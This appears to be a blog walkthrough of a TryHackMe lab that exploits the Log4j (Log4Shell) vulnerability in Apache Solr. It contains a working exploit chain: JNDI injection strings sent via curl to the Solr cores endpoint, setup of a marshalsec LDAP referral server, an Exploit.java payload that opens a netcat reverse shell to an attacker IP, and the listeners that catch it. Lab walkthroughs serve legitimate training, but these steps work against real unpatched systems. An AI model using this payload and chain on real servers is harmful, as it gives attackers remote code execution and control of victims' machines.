---
layout: post
title:  "LOG4J-Solr-THM-Walkthrough"
date:   2022-01-04 17:03:35 +0530
categories: jekyll update
---

The room for practicing Log4j can be found here: https://tryhackme.com/room/solar

{% highlight ruby %}Phase 1: Reconnaissance{% endhighlight %}

We explore the web interface at http://machine_ip[:]8983; we explore and look around for the log files, to see which path or URL endpoint triggers the logging. 

We find that {% highlight ruby %}“solr/admin/cores/”{% endhighlight %} is where a user can control the data entry point. 
 
You may already know the general payload to abuse this log4j vulnerability.

The format of the usual syntax that takes advantage of this looks like so: 
                ${jndi: ldap://ATTACKERCONTROLLEDHOST} 

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For now, know that the target will in fact make a connection to an external location. This is indicated by the 
ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection. 
 
We already discovered that we could supply parameter to the /solr/admin/cores URL to insert our JNDI Syntax. 

Other locations you might supply this JNDI syntax: 
•	Input boxes, user and password login forms, data entry points within applications 
•	HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers 
•	Any place for user-supplied data 

{% highlight ruby %}Phase 2: Testing{% endhighlight %} 
To prepare your environment for testing the vulnerability and receiving a connection 

1.	We view our own IP address information: 
a.	“ip addr show” OR “ip -br -c a” 
  
2.	We prepare a netcat listener on port 9999  
a.	“nc -nlvp 9999” 
  
3.	Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility. 

{% highlight ruby %}“curl ‘http://machine_ip[:]8983/solr/admin/cores?foo$\{jndi:ldap://Your.IP.Address:9999\}’{% endhighlight %}  
  
Note, due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes, so bash (your command-line shell) does not interpret it as a variable. 
Additionally, you must escape out the { } curly braces with a single backslash character, so those are not misrepresented in the curl command arguments. 

4.	Verify you have received a connection by seeing the following message in your netcat listener: 
a.	“Connection received from MACHINE_IP” 
  
{% highlight ruby %}Phase 3: Preparation and Payload Creation{% endhighlight %} 
At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP Handler. We will utilize an open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so: 
{% highlight ruby %}
1.	${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server 
2.	LDAP Referral Server springboards the request to a secondary http://attackerserver/resource 
3.	The victim retrieves and executes the code present in http://attackerserver/resource 
{% endhighlight %} 

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000): 
{% highlight ruby %}
	• 	python3 -m http.server 8000 
{% endhighlight %}  

The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec 

Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine) 

You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/ and we install Java 8 locally. 
Now we install Marshalsec utility from github. 
{% highlight ruby %}
1. Clone the repository in any file system location of your choice (I would suggest /tmp or /opt): 
a. git clone https://github.com/mbechler/marshalsec 

2.	Download and change directories into this new folder (cd marshalsec) We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager: 'sudo apt install maven'

3.	Now, we install the maven packages:  'mvn clean package -DskipTests' 

4.	With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). The syntax to start the LDAP server is as follows: 
a. java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit” 
{% endhighlight %}

Adjust the IP address for your attacking machine as needed. Note that we supplied the HTTP port listening on 8000. 

You will see an output on your window similar to below: 
{% highlight ruby %}"Listening on 0.0.0.0:1389"{% endhighlight %}
 
Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare our final payload and secondary HTTP server. 

Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. 

Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code etc), with the specific name Exploit.java: 

{% highlight ruby %}
public class Exploit {static {try { java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999"); } catch (Exception e) {e.printStackTrace(); 
}}} 
{% endhighlight %}

Compile your payload with {% highlight ruby %}javac Exploit.java -source 8 -target 8{% endhighlight %} and verify it succeeded by running the {% highlight ruby %}'ls'{% endhighlight %} command and finding a newly created {% highlight ruby %}Exploit.class{% endhighlight %} file 
  
With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.  {% highlight ruby %}Python3 -m http.server 8000{% endhighlight %}
  
{% highlight ruby %}Phase 4: Exploitation{% endhighlight %}

Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999 
  
Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit: 
{% highlight ruby %}
curl 
'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}' 
{% endhighlight %}

You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability.  
  
At this point, a threat actor can realistically do whatever they would like with the victim -- whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation -- potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware.  
All it took was a single string of text, and a little bit of set up with freely available tooling. 

This was precisely why the Internet has been on fire during the weekend of December 9th, 2021.  

